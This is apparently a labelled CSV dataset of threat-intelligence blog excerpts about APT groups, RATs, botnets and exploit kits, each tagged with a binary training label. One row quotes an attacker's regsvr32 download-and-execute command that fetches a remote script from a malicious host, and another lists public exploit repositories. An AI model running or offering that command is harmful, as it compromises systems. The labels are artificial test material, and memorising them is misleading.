ID,SPLIT,description,long_pat_train_label
882,Long_Train,"the work of a group involved in business email compromise (BEC) or cybercrime, and unlikely to be an advanced persistent threat (APT). It’s worth noting that the group uses YOPmail, a disposable email address service, for its command and control server (C&C). The payload, written in Visual Basic 6, is a customized version of a remote access tool called “Proyecto RAT.” Our in-depth analysis of the malware is detailed in this appendix . The delivery emails The infection starts with an email sent to a target, as seen in the screenshot below (Figure 1). In multiple instances, we noticed the attacker used open or compromised mail servers in South America to facilitate the campaigns. The attacker also connected to the compromised servers from IP addresses that were linked to dynamic domain names used as C&Cs by the delivered payloads. This suggests that the attacker uses the same infrastructure to send emails and control victims. The sender of the email is usually spoofed, and",0
883,Long_Train,"East Asia. The victims are the countries around the South China Sea, and these countries belong to the Association of Southeast Asian Nations (ASEAN). The SectorF01 group’s intensive attack targets are in the following countries: • Vietnam • China • Cambodia • Laos • Thailand • Myanmar • Phillipines • Malaysia • Indonesia • Singapore Recently, they have also been expanding their cyber espionage activities to the following countries in East Asia: • Japan • South Korea Targets of the SectorF01 group The ellipses marked with red dotted lines are the range of countries targeted by the SectorF01 group, and the dark red ellipses are the range of countries where the attack is more concentrated. The ellipses, marked with orange dotted lines, are a range of countries that have recently been included in the attack target as the SectorF01 group expands their activities. Target Industries The SectorF01 group conduct cyber espionage activities against various fields as follows: • Vietnamese dissidents, journalists, and activists • ASEAN-related organizations • Government institutions • Diplomatic institutions • Military institutions • Marine-related organizations : Maritime organizations, marine research institutes, shipping companies, etc • Scientific research institutes • Universities and educational institutions • Foreign companies in Vietnam • Automotive Industry Statistics for Cyber Espionage Activities in SectorF01 Group The SectorF01 group has seen steady annual grown since its inception as a cyber espionage player in 2013 and has become one of the most influential threat actor groups in Southeast Asia. We created statistics about their activities through the more than 800 malware executables that the SectorF01 group used to attack. About 800 malwares used in the statistics are all Windows executables. Polymorphic binaries which are executed by sandboxes and whose file hashes change each time they are run are excluded from these statistics, so only the initial file is included. We are excluding such polymorphic binaries which are not used in attacks to minimize statistical errors and misinterpretation. This is a graph aggregating the number of malwares used in attacks by the SectorF01 group every year. It can be seen that the number of malware that they use each year is steadily increasing. The Growth of the SectorF01 group’s Malware The following are the statistics for the time and day when the SectorF01 group created the malware. We have analyzed about seven years of cyber espionage activity of the SectorF01 group and have concluded that they are highly likely to be threat actor groups sponsored by the Vietnamese government. We created statistics on compile times with the timestamp of about 500 binaries, after excluding those considered to have modified timestamps among the 800 binaries. Assuming that the SectorF01 group is active in Vietnam, we set the time zone to “UTC+7″(Vietnam time zone) and created statistics based on that. Considering that the business hours in Vietnam are mainly from 8:00 am to",1
884,Long_Train,"threat actors. Infection chain On April 2, 2019, during regular malware monitoring, an unusual Office document caught the eye of specialists at PT ESC. Figure 1. Malicious attachment (named ""Package Notification"") Disguised as a package notification, the file had been created in Microsoft Excel and saved in the old .xls format on the previous day (timestamp 2019-04-01 16:28:07 (UTC)). However, the ""last printed"" timestamp (2018-07-25 00:12:30 (UTC)) indicates that the document had been used in 2018. More on this later. Note that the Comments field (which can be edited from within Excel) contains Windows console commands: cmd.exe /c echo Set objShell = CreateObject(""Wscript.Shell""): objShell.Run ""net use https://postahr.vip"", 0, False: Wscript.Sleep 10000: objShell.Run ""regsvr32 /u /n /s /i:https://postahr.vip/page/1/update.sct scrobj.dll"", 0, False: Set objShell = Nothing > C:\users\%username%\appdata\local\microsoft\silent.vbs Figure 2. Comments field with suspicious contents Figure 3. Contents of the Comments field, in binary form This command creates a Visual Basic script that, when run, performs the following actions: Establishes a WebDAV network connection. Downloads and runs the file for the next stage of infection, with the help of the legitimate system utility regsvr32. When a HTTP(S) connection is established with the attacker's server, an NTLM request is sent. This request can be used to recover the NTLM hash for pass-the-hash attacks. We did not find signs of such attacks; the reasons for",0
885,Long_Train,"devices with the primary intent of launching DDoS attacks and self-propagation, since 2016 when it took down several notable targets. As part of this ongoing research, we’ve recently discovered a new variant of Mirai that has eight new exploits against a wide range of embedded devices. These newly targeted devices range from wireless presentation systems to set-top-boxes, SD-WANs, and even smart home controllers. Mirai initially made use of default credentials to gain access to devices. However, since the end of 2017 , samples of the family have increasingly been observed making use of publicly available exploits to propagate and run on vulnerable devices. 2018 saw a continued increase in the emergence of campaigns involving variants incorporating several exploits within the same sample, allowing for the harvesting of several different kinds of IoT devices into the same botnet. Since then we have also observed Mirai malware authors experimenting with new exploits , found on the publicly available exploit-db, to gauge gains in bot count from the use of these exploits. This latest new variant we’ve observed and detailed in this post appears to be a continuation of the same trend. Exploits This latest variant contains a total of 18",1
886,Long_Train,"– how is it being spread – phishing emails? Who was it being sent to (industry vertical, geographic region?) How many infections,",0
887,Long_Train,"companies from several verticals across the EMEA region. The campaign seemed to be related to the MenuPass (a.k.a. APT10/Stone Panda/Red Apollo) threat actor, and utilized an open-source backdoor named QuasarRAT to achieve persistence within an organization. We identified several distinct loader variants tailored to specific targets by leveraging machine learning (ML) to analyse our malware corpus. We have not observed new QuasarRAT samples in the wild since late 2018, roughly coinciding with when the FBI indicted several members of the MenuPass group. QuasarRAT is a lightweight remote administration tool written in C#. It can collect system information, download and execute applications, upload files, log keystrokes, grab screenshots/camera captures, retrieve system passwords and run shell commands. The remote access Trojan (RAT) is loaded by a bespoke loader (a.k.a. DILLWEED). The encrypted QuasarRAT payload is stored in the Microsoft.NET directory, decrypted into memory, and instantiated using a CLR host application. In later variants an additional component is also used to install the RAT as a service (a.k.a DILLJUICE). The following technical analysis focuses on the bespoke QuasarRAT loader developed by MenuPass and",1
888,Long_Train,create an info graphic showing evolution of ransomware attack complexity evolution from nuisance to extortion to,0
889,Long_Train,"April 2012 with initial targets including Chinese maritime institutions, maritime construction, scientific research institutes and shipping enterprises. Their targets expanded to almost all important organizations afterwards and related activities are still active now. The RedDrip Team (@RedDrip7) keeps a close eye on activities made by OceanLotus. Last month we released an in-depth analysis report: OceanLotus’ Attacks to Indochinese Peninsula: Evolution of Targets, Techniques and Procedure. Currently we capture another attack incident targeting a Vietnamese environmentalist with new malware payload and hope the revealed details could lead to more findings in the future. Bait Analysis The bait sample is a zip archive in Vietnamese:Thông tin về chuyên đề môi trường_Nhờ anh Đặng Vũ Lượng tư vấn thêm.zip From the contents of the compressed package, the three pictures named in Vietnamese meaning ""illustration"" respectively show that there is garbage in the rivers",1
890,Long_Train,"Linux virtual machine, making it cross platform. It comes bundled with pirated copies of VST software. The miner itself is based on XMRig (Monero) and uses a mining pool, thus it is impossible to retrace potential transactions. Distribution At the time of writing, there are 137 VST-related applications (42 for Windows and 95 for macOS) available on a single WordPress-based website with a domain registered on 24 August, 2018. The first application – Kontakt Native Instruments 5.7 for Windows – was uploaded on the same day. The size of the apps makes it impractical to analyze them all, but it seems safe to assume they are all Trojanized. The applications themselves are not hosted on the WordPress-based site, but on 29 external servers, which can be found in the IoCs section. The admins of the site also frequently update the applications with newer versions, making it difficult to track the very first version of the miner. Regarding the nature of the applications targeted, it is interesting to observe that their purpose is related to audio production; thus, the machines that they are installed on should have good processing power and high CPU consumption will not surprise the users. Also, these applications are usually complex, so it is not unexpected for them to be huge files. The attackers use this to their advantage to camouflage their VM images. Moreover, the decision to use virtual machines instead of a leaner solution is quite remarkable and this is not something we routinely see. Here are some examples of applications, as well as some comments you can find on the website: Propellerhead Reason Ableton Live Sylenth1 Nexus Reaktor 6 AutoTune Figure 1. Comment #1 from the “admin Figure 2. Comment #2 from the “admin” User reports We found several forum threads of users complaining about a qemu-system-x86_64",1
891,Long_Train,"5, 2019 July 19, 2019 norfolk Updated 19 July with Attribution Comments Recently, Palo Alto’s Unit42 and Saudi NCSC detailed multiple intrusions against Middle Eastern government targets in which an attacker (purportedly Emissary Panda, a suspected Chinese state-sponsored adversary) compromised vulnerable Microsoft SharePoint servers and deployed a variety of intrusion tools, both public and custom.** Subsequent public reporting , however, attributed a",0
892,Long_Train,"an executable file which turned out to be a ransomware written in Delphi. DanaBot was already involved in sending spam and cooperating with GootKit in the past, as well as dropping Remcos RAT on infected machines. While DanaBot is still actively supported, its operators now add new plugins and configuration files and update various parts of the malware (including string encryption and file name generation algorithms, and even the communication protocol). In the following report, we will review the latest updates in DanaBot’s functionality, and take a deep dive into the inner-workings and encryption methods of this new ransomware . DanaBot Overview DanaBot is a banking Trojan which is distributed using phishing emails. Links usually lead to either a JavaScript or PowerShell dropper. The malware has the following capabilities: Stealing browsers and FTP clients credentials Collecting crypto wallets credentials Running a proxy on an infected machine Performing Zeus-style web-injects Taking screenshots and recording video Providing a remote control via RDP or VNC Requesting updates via TOR Bypassing UAC using a WUSA exploit Requesting updates from C&C server and execute commands All DanaBot versions communicate with the C&C server via a custom TCP-based protocol over 443 port. Since its first appearance, DanaBot has spread throughout Europe, Australia, New Zealand, USA and Canada.",0
893,Long_Train,"& Infographics Discover the features and benefits of our cybersecurity solutions Threat Watch Stay informed of cybersecurity news & events Videos Browse our video library to learn more about Binary Defense White Papers Dive deep into cybersecurity trends and tactics Webinars Learn about the latest cybersecurity trends from industry experts From the Blog Hunting and Defeating Evasive Threats Binary Defense July 27, 2020 Written by: Randy Pargman and James Quinn Threat actors spend a lot of time and energy to Read More » Russian Cybercriminal Group Attempts to Steal COVID-19 Vaccine Research Binary Defense July 20, 2020 Last week, as reported in Threat Watch, the APT29 threat group, attributed to Russia’s intelligence Read More » Hackers for Hire: An Overview of the Unethical Services Offered on the Darknet Binary Defense June 16, 2020 By: Dan McNemar It is not a new concept that criminals use the Darknet to Read More » Featured Webinar Ransomware: What Businesses Need to Know to Stay Safe August 4, 2020 In this webinar, Binary Defense Chief Technology Officer, David Kennedy, and Senior Director of Counterintelligence Read More » About Why Binary Defense Our Team News & Events In the Media Careers Partners Become a Partner Portal Login Contact Contact Sales Contact Support Search Close Binary Defense Blog Gh0stCringe (Formerly CirenegRAT) Gh0stCringe (Formerly CirenegRAT) James Quinn Back to the Blog June 20, 2019 9:28 am Share on facebook Share on twitter Share on linkedin Since early December, 2018, I’ve been seeing a new type of Gh0stRAT-like",1
894,Long_Train,"named it Linux.Ngioweb. It shares a lot of code with Win32.Ngioweb, except that it has DGA features. We registered one of the DGA C2 domain names (enutofish-pronadimoful-multihitision.org) and was able to observe the Bot connections. In addition, we have observed that Linux.Ngioweb malware has been implanted into a large number of WordPress Web servers. Although the Bot program is loaded with the privilege of the user group corresponding to the Web container, it still works and runs as Rotating Proxy node[ 2] . We don’t know why the attacker runs this proxy botnet, but it is possible that everything goes through the proxy is being recorded by the attacker. Overview of Linux.Ngioweb The main functionality of the Linux.Ngioweb Bot sample is to implement Back-Connect Proxy[ 3] .on the victim's machine. The attacker builds multiple Bots into a Proxies Pool and controls it through a two-tier C2 protocol, then provides",0
895,Long_Train,"authentication by default, similar to the Satori botnet variant we previously reported . This bot’s design allows it to spread from the infected host to any system that has had a previous SSH connection with the host. The use of ADB makes Android-based devices susceptible to the malware. We detected activity from this malware in 21 different countries, with the highest percentage found in South Korea. Technical details ADB Arrival We found that the IP address 45[.]67[.]14[.]179 connects to the ADB running device or system then conducts several activities. Figure 1 summarizes the attack’s infection chain. Figure 1. Infection chain of the attack The",1
896,Long_Train,You need to enable JavaScript to run this app.,0
897,Long_Train,"illustrates this more than the anticipation surrounding BlueKeep , a vulnerability if exploited with RCE that could have major impacts. To date, there have been multiple claims and demos of working PoCs that have not been released. In the case of CVE-2019-3396 , a vulnerability affecting Confluence, a number of PoCs emerged in short order. We recently blogged about the post-exploit attacks we observed from the vulnerability. In this blog, we discuss the attack attempts we see along with the corresponding public PoCs. Proof of Concepts As of this writing, a number of PoCs for CVE-2019-3396 are publicly available: https://github.com/Yt1g3r/CVE-2019-3396_EXP https://github.com/MCKSysArgentina/CVE-2019-3396/blob/master/x.vm https://github.com/jas502n/CVE-2019-3396 https://github.com/x-f1v3/CVE-2019-3396 https://github.com/pyn3rd/CVE-2019-3396 https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/20190404_WEB_Confluence_path_traversal.py https://github.com/shadowsock5/CVE-2019-3396 Most of these PoCs inject Velocity Template (.vm) file in the “_template” parameter and then provide another parameter that takes a command to",0
898,Long_Train,Request Demo Cyber Risk Assessment Learn how Zscaler enables work-from-anywhere. Download the eBook today Products Zscaler Internet Access ZIA Overview Secure Web Gateways Cloud Firewall Cloud IPS Cloud Sandbox Cloud DLP Cloud Application Control Bandwidth Control Cloud Browser Isolation Cloud Access Security Broker (CASB) Cloud Security Posture Management (CSPM) Zscaler Private Access ZPA Overview ZPA for AWS ZPA for Azure ZPA Interactive Demo Zscaler Platform SASE Architecture SSL Inspection Data Protection and Privacy Zscaler Client Connector (formerly Z App) Zscaler B2B Ready to experience zero trust network access? Take ZPA for a free test-drive. Experience Now Solutions Network Transformation Office 365 Rethink Network Security Direct-to-cloud Architecture SD-WAN Security Security Transformation Cloud Security Secure Web Gateways,0
899,Long_Train,"it's through blatant social engineering attacks like ongoing sextortion campaigns or through the countless malspam messages traversing the globe daily, users are required to help achieve infection. That is where exploit kits stand alone as an effective web-based platform for compromise that only requires users to surf the internet. Today, Cisco Talos is unveiling the details of a new exploit kit campaign that proves exploit kits are still a threat and should be taken seriously by defenders: Spelevo. This recent campaign leveraged a compromised business-to-business site to deliver Spelevo, one of the first new kits we've seen in months. Spelevo illustrates many of the challenges associated with protecting against these threats and preventing their spread. In compromising this particular website, the attackers did little more than add four lines to the code rendering the webpage — but those four lines did a lot of damage and can compromise all visitors that have poor security hygiene. Even though Angler did make use of a zero-day in Adobe Flash Player years ago , exploit kits largely depend on existing, patched exploits. However, all it takes is one missed patch on one system to lead directly to compromise. That's why you need things like a thorough defense-in-depth approach with various technologies in place to help mitigate",0
900,Long_Train,"on 64-bit systems to hide API calls by switching to a 64-bit environment. In this blog, we will show how to analyze this loader quickly, and provide an overview of how these attackers deliver the well-known HawkEye Reborn malware. During our analysis, we also discovered several notable malware families, including Remcos and various cryptocurrency mining trojans , leveraging the same loader in an attempt to evade detection and impede analysis. Technical overview First, let's go through a high-level overview of the loader that's used to hide and execute HawkEye Reborn. The ""technical details"" section will describe these stages in detail. Even if the final malware is packed and coming with its own obfuscation, it is never written to the disk. It's always hidden inside the loader, so it's difficult for antivirus systems to detect it. Find and resolve some basic API calls by CRC32. Decode encoded code from the .data section. Jump to this code. Perform some anti-debug/anti-analysis checks. Load two resources (in this case, UDXCUSCK and SCCJZ) from the loader's PE file. Decode the configuration stored in the UDXCUSCK resource. Copy loader to %APPDATA% folder and make it persistent via StartUp link. Decode the malware payload (in this case HawkEye) stored in SCCJZ resource. Start the legitimate RegAsm.exe process. Inject and execute malware payload (HawkEye) into this process via process-hollowing. Protect injected malware code. Exit loader process. The majority of API calls are executed by a function we called ""Exec_Function"": This function takes a custom hash value for the wanted API call as one of its arguments. It finds the kernel.dll address via its CRC32 checksum. Then, it resolves the addresses of basic API calls by name by iterating over the InMemoryOrderModuleList in the PEB_LDR_DATA structure. Next, it resolves",0
901,Long_Train,"Partners Resources Company Anomali Product Suite Anomali intelligence-driven security products provide unmatched threat visibility and accelerated detection, allowing customers to reduce the risk of security breaches and improve security team productivity. Learn more Our Products ThreatStream Operationalize your threat intelligence under a single platform to speed the detection of threats and enable proactive defense measures. Match Automate the detection of threats in your network by continuously correlating all available threat intelligence against all your event logs. Lens Access threat intelligence knowledge at your fingertips, identify new and known threats, and understand if you’ve been impacted – in seconds. The Anomali App Store A unique cybersecurity marketplace providing instant access to a growing catalog of threat intelligence providers, integration partners, and threat analysis tools. Learn more Marketplace Offerings Threat Intelligence Feeds Trial and purchase threat intelligence feeds from Anomali partners – find the right intelligence for your organization, industry, geography, threat type, and more. Threat Analysis Tools & Enrichments Gain the tools to pivot quickly from one piece of information to look up other sources of data to get a complete picture of a threat – all one click away. Security System Partners Anomali seamlessly integrates with many Security and IT systems to operationalize threat intelligence. For Partners Anomali SDKs Become an APP Store Partner Partners Overview Anomali offers",0
902,Long_Train,"An Analysis of its Masquerading and Code Injection Techniques Technical Blog July 29, 2019 • Category: Threat Research • By: Ratnesh Pandey • Comments: 0 Dridex’s Bag of Tricks: An Analysis of its Masquerading and Code Injection Techniques A new variant of Dridex observed in July 2019 masquerades as legitimate Windows system processes to avoid detection . The variant uses five code injection techniques during its infection lifecycle: AtomBombing, DLL order hijacking, p rocess hollowing, PE injection and t hread execution hijacking. The code injection techniques were used against legitimate W indows executables . An incremental integer value is supplied to the command line to the suspended process to perform specific tasks. Since the lull in Emotet activity at the beginning of June 2019 and AZORult , Dridex and ransomware campaigns have become more prominent. In July 2019 we observed a phishing campaign delivering the Dridex banking Trojan. The payload was isolated by Bromium Secure Platform and captured the malware, which helped us to analyse its infection chain and to understand how the attack worked. In this blog post, we go through the stages of its infection chain to showcase how Dridex uses five code injection techniques to masquerade itself as legitimate Windows processes (MITRE ATT&CK technique T1036 ) to avoid detection. Before jumping into the behavio u r",1
903,Long_Train,"espionage and financially-focused group, APT41 targets industries such as gaming, healthcare, high-tech, higher education, telecommunications, and travel services. APT41 is known to adapt quickly to changes and detections within victim environments, often recompiling malware within hours of incident responder activity. In multiple situations, we also identified APT41 utilizing recently-disclosed vulnerabilities, often weaponzing and exploiting within a matter of days. Our knowledge of this group’s targets and activities are rooted in our Incident Response and Managed Defense services, where we encounter actors like APT41 on a regular basis. At each encounter, FireEye works to reverse malware, collect intelligence and hone our detection capabilities. This ultimately feeds back into our Managed Defense and",0
904,Long_Train,"Resources Company Anomali Product Suite Anomali intelligence-driven security products provide unmatched threat visibility and accelerated detection, allowing customers to reduce the risk of security breaches and improve security team productivity. Learn more Our Products ThreatStream Operationalize your threat intelligence under a single platform to speed the detection of threats and enable proactive defense measures. Match Automate the detection of threats in your network by continuously correlating all available threat intelligence against all your event logs. Lens Access threat intelligence knowledge at your fingertips, identify new and known threats, and understand if you’ve been impacted – in seconds. The Anomali App Store A unique cybersecurity marketplace providing instant access to a growing catalog of threat intelligence providers, integration partners, and threat analysis tools. Learn more Marketplace Offerings Threat Intelligence Feeds Trial and purchase threat intelligence feeds from Anomali partners – find the right intelligence for your organization, industry, geography, threat type, and more. Threat Analysis Tools & Enrichments Gain the tools to pivot quickly from one piece of information to look up other sources of data to get a complete picture of a threat – all one click away. Security System Partners Anomali seamlessly integrates with many Security and IT systems to operationalize threat intelligence. For Partners Anomali SDKs Become an APP Store Partner Partners Overview Anomali offers competitive advantages and new revenue opportunities for partners",0
905,Long_Train,and insight from the ESET security community First‑of‑its‑kind spyware sneaks into Google Play ESET analysis breaks down the first known spyware that is built on the AhMyth open-source espionage tool and has appeared on Google Play – twice Lukas Stefanko 22 Aug 2019 - 11:30AM Share ESET analysis breaks down the first known spyware that is built on the AhMyth open-source espionage tool and has appeared on Google Play – twice ESET researchers have discovered the first known spyware that is built on the foundations of AhMyth open-source malware and has circumvented Google’s app-vetting process. The,0
906,Long_Train,"the application? Reply Niels Heinen Posted on August 28, 2019. 6:07 am Nice find! I wish you actually described what kind of malicious payloads you actually found. It’s not clear from the article that this was actually abused (the presented scenario’s are hypothetical) Reply",0
907,Long_Train,"""Operation Soft Cell,"" which reportedly utilized China Chopper. Cisco Talos discovered significant China Chopper activity over a two-year period beginning in June 2017, which shows that even nine years after its creation, attackers are using China Chopper without significant modifications. This web shell is widely available, so almost any threat actor can use. This also means it's nearly impossible to attribute attacks to a particular group using only presence of China Chopper as an indicator. The usage of China Chopper in recent campaigns proves that a lot of old threats never really die, and defenders on the internet need to be looking out for malware both young and old. What is China Chopper? China Chopper is a tool that allows attackers to remotely control the target system that needs to be running a web server application before it can be targeted by the tool. The web shell works on different platforms, but in this case, we focused only on compromised Windows hosts. China Chopper is a tool that has been used by some state-sponsored actors such as Leviathan and Threat Group-3390 , but during our investigation we've seen actors with varying skill levels. In our research, we discovered both Internet Information Services (IIS) and Apache web servers compromised with China Chopper web shells. We do not have additional data about how the web shell was installed, but there are several web application frameworks such as older versions of Oracle WebLogic or WordPress that may have been targeted with known remote code execution or file inclusion exploits. China Chopper provides the actor with a simple GUI that allows them to configure servers to connect to and generate server-side code that must be added to",1
908,Long_Train,"tool malware family. We used this code name based on its description – “Brazilian RAT Android”. It exclusively targets victims in Brazil: however, theoretically it could also be used to attack any other Android user if the cybercriminals behind it want to. It has been widespread since January 2019, primarily",1
909,Long_Train,"steganography. The way Heatstroke’s operators do research on their potential victims is notable. They aim for their victim’s private email addresses, which they most likely collected from the victim’s own address list, which also includes managers and employees in the technology industry. Private email addresses are more likely to be hosted on free email services with lax security and spam filtering. They’re also usually used as verification for social media and e-commerce websites, as well as backups for Gmail and business accounts. Gmail accounts are particularly interesting; attackers that gain access to these accounts can also access the victim’s Google Drive, and, under certain circumstances, potentially compromise the Android device linked to the account. These free email accounts could thus serve as better starting points for attackers to reconnoiter and gather intelligence on their targets compared to business emails, which are typically more secure. Heatstroke’s attack chain Heatstroke’s operators appear to have used these countermeasures to hide their trails: Multistage phishing attack. To avoid suspicion, the attackers do not hurry or spread their attack over multiple screens/pages. Compared to a usual phishing attack that would employ a single landing page, Heatstroke’s multistage approach tries to mimic what",0
910,Long_Train,"wild Posted by Ian Beer, Project Zero Project Zero’s mission is to make 0-day hard. We often work with other companies to find and report security vulnerabilities, with the ultimate goal of advocating for structural security improvements in popular systems to help protect people everywhere. Earlier this year Google's Threat Analysis Group (TAG) discovered a small collection of hacked websites. The hacked sites were being used in indiscriminate watering hole attacks against their visitors, using iPhone 0-day. There was no target discrimination;",0
911,Long_Train,"activities this year and recent cases of the SectorJ04 group’s hacking. SectorJ04 group activity range and hacking methods The SectorJ04 group has maintained the scope of its existing hacking activities while expanding its hacking activities to companies in various industrial sectors located in East Asia and Southeast Asia. There was a significant increase in their hacking activities in 2019, especially those targeting South Korea. They mainly utilize spam email to deliver their backdoor to the infected system that can perform additional commands from the attacker’s server. Main countries and sectors targeted The SectorJ04 group’s preexisting targets were financial institutions located in countries such as North America and Europe, or general companies such as retail and manufacturing, but they recently expanded their areas of activity to include the medical, pharmaceutical, media, energy and manufacturing industries. They do not appear to place much restrictions on the sectors targeted. The following are the sectors and countries under which SectorJ04 group was found in 2019. Figure 1 SectorJ04 group’s first half activity timeline in 2019 Targeted Countries We saw SectorJ04 group activity in Germany, Indonesia, the United States, Taiwan, India, France, Serbia, Ecuador, Argentina, South Korea, Japan, China, Britain, South Africa, Italy, Hong Kong, Romania, Ukraine, Macedonia, Russia, Switzerland, Senegal, the Philippines, UAE, Qatar, Saudi Arabia, Pakistan, Thailand, Bahrain, Turkey, Bulgaria, Bangladesh. Figure 2 SectorJ04 group targeted countries Targeted Industries Financial-related corporate and government departments such as banks and exchanges Retail business such as shopping malls and social commerce Educational institutions such as a universities Manufacturing companies such as manufactures of electronic products Media companies such as broadcasting and media Pharmaceutical and biotechnology-related companies A job-seeking company Energy-related companies such as urban gas and wind power generation Hacking Techniques The SectorJ04 group mainly utilizes a spear phishing email with MS Word or Excel",0
912,Long_Train,Identify Emails. Hunt Threats Faster Cofense PDC Use Cofense Experts As Your Phishing Response Team Intelligence Cofense Intelligence Proactively Stop Threats Before They Arrive Solutions Solutions By Industry Critical Infrastucture Financial Services US Federal Government Healthcare Higher Education Legal & Professional Services Manufacturing Energy/Utilities Technology Retail Solutions By Topic Incident Response Security Awareness Compliance Resources Election Security Solutions By Role Security Leadership Incident Response Threat Intelligence Security Awareness Pricing About Our Company About Us Events Awards Investors Careers News Center Cofense Labs Cofense Dev Leadership Management Team Board of Directors COFENSE SOLUTIONS Search and destroy the phish your email gateway misses. Explore Cofense Phishing Defense Solutions. Visit Solution Hub Free Tools Build Resilience Email Gateway Infocenter Learn,0
913,Long_Train,"are located on Github and Feed43. Multiple Github spaces have been exposed through correlation analysis and the earliest one could trace back to July 2018. The relevant accounts were still in use when the report was completed. Decryption algorithm for configurations retrieved from Github will be described in detail and the portrait of the attacker is partially based on statistics of the decrypted data. Sample Analysis The related attack vector is an XLSM file, created on August 8 and uploaded to VT on August 13, that leverages CVE-2017-11882 vulnerability to release MSBuild.exe to the %AppData% directory and then add registry Run key to stay persistent. To obtain C2 address, it reads data from Github and Feed43 where the",0
914,Long_Train,"on their content. Computers force users to label and annotate their data based on the data type, role, and purpose. This human-computer convention means that most digital content has some descriptive surface area, or descriptive “features” that are present in many files, including malware files. FireEye approaches detection and hunting from many angles, but on FireEye’s Advanced Practices team, we often like to flex on “weak signals.” We like to search for features of malware that are not evil in isolation but uncommon or unique enough to be useful. We create conditional rules that when met are “weak signals” telling us that a subset of data, such as a file object or a process, has some odd or novel features. These features are often incidental outcomes of adversary methods, or modus operandi, that each represent deliberate choices made by malware developers or intrusion operators. Not all these features were meant to be in there, and they were certainly not intended for defenders to notice. This is especially true for PDB paths, which can be described as an outcome of the compilation process, a toolmark left in malware that describes the development environment. PDBs A program database (PDB) file, often referred to as a “symbol file,” is generated upon compilation to store debugging information about an individual build of a program. A PDB may store symbols, addresses, names of functions and resources and other information that may assist with debugging the program to find the exact source of an exception or error. Malware is software, and malware developers are software developers. Like any software developers, malware authors often have to debug their code and sometimes end up creating PDBs as part of their development process. If they do not spend time debugging their malware, they risk their malware not functioning correctly on victim hosts, or not being able to successfully communicate with their malware remotely. How PDB Paths are Made (the birds and the PDBs?) But how are PDBs created and connected to programs? Let’s examine the formation of one PDB path through the eyes of a malware developer and blogger, the soon-to-be-infamous “smiller.” Smiller has a lot of programming projects and organizes them in an aptly labeled folder structure on his computer. This project is for a shellcode loader embedded in an HTML Application (HTA) file, and the developer stores it quite logically in the folder: D:\smiller\projects\super_evil_stuff\shellcode\ Figure 1: The simple “Test” project code file “Program.cs” which embeds a piece of shellcode and a launcher executable within an HTML Application (HTA) file Figure 2: The malicious Visual Studio solution HtaDotnet and corresponding “Test” project folder as seen through Windows Explorer. The names of the folders and files are suggestive of their functionalities The malware author then compiles their “Test” project Visual Studio in a default “Debug” configuration (Figure 3) and writes out Test.exe and Test.pdb to a subfolder (Figure 4). Figure 3: The Visual Studio output of a default compiling configuration Figure 4: Test.exe and Test.pdb are written to a default subfolder of the code project folder In the Test.pdb file (Figure 5) there",0
915,Long_Train,"Communist Party (CCP). Recent reporting has shown that this point of view by the CCP against the Uyghur people has resulted in wide-scale harassment , relocation to detention camps , and oppressive high-tech surveillance aimed at tracking physical movements and behavior. With all of these reports on physical real-world issues, it should come as no surprise that cyberspace has become a battle ground for the Uyghur people. The level of surveillance occurring in China against Uyghurs extends well beyond their borders and has fully entered the digital realm. In this blog, Volexity plans to shed some light on the barrage of cyber attacks that have been unleashed upon Uyghurs. Since its formation in 2013, Volexity has worked closely with various non-governmental organizations (NGOs), activists, dissidents, human rights defenders, and other highly targeted groups that are often at a severe disadvantage with respect to the threat actors that are targeting them. Volexity’s goal is to always level the playing field as much as possible through awareness and by collaboratively building more defensible and resilient networks and systems. Over the years, Volexity has gained amazing insight into what could be considered to be some of the most advanced and scariest cyber attacks imaginable. Volexity has worked closely with various Uyghur individuals and organizations and has witnessed an unrelenting series of attacks that started well before 2013 and continue to this day. In the last few years, Volexity has observed an increase in the number of compromised Uyghur and East Turkistan websites. These websites have been leveraged to track and launch",1
916,Long_Train,"system tools throughout a complex attack chain. If you haven’t, you SHOULD definitely read the details of the research article done by the Microsoft team here . Dismantling a fileless campaign: Microsoft Defender ATP’s Antivirus exposes Astaroth attack … The prevailing perception about fileless threats, among the security industry’s biggest areas of concern today, is that… www.microsoft.com Following the report, the group behind the Astaroth attack campaign changed tactics and they ran a similar campaign again earlier in august with few changes, notably use of Cloudflare Workers . In this article I will try to show highlight the changes and show a clear chain of attack from the delivery till infection, something Microsoft research article failed to do. Let’s go. First Stage: The actors behind the campaign used classic social engineering in this step. They sent a typical message that looks like any of automated emails organizations get about Audit or Billing requests. There is an HTML attachment which is not trying to hide in any sort of way that it’s an HTML file. But this is not a simple HTML file with external links to malware. It’s a carefully crafted",0
